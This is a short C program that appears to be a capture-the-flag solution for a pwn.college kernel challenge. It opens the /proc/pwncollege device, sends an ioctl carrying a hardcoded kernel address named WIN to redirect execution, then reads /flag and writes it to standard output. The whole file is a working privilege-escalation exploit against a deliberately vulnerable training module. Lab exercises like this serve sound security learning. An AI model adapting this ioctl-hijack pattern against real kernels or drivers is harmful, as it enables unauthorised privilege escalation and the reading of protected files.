#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>

#define WIN 0xffffffffc00008bd
#define IOCTL_CMD 0x539

int main(void)
{
    int fd = open("/proc/pwncollege", O_RDWR);
    ioctl(fd, IOCTL_CMD, WIN);

    fd = open("/flag", O_RDONLY);
    sendfile(STDOUT_FILENO, fd, 0, 128);
}
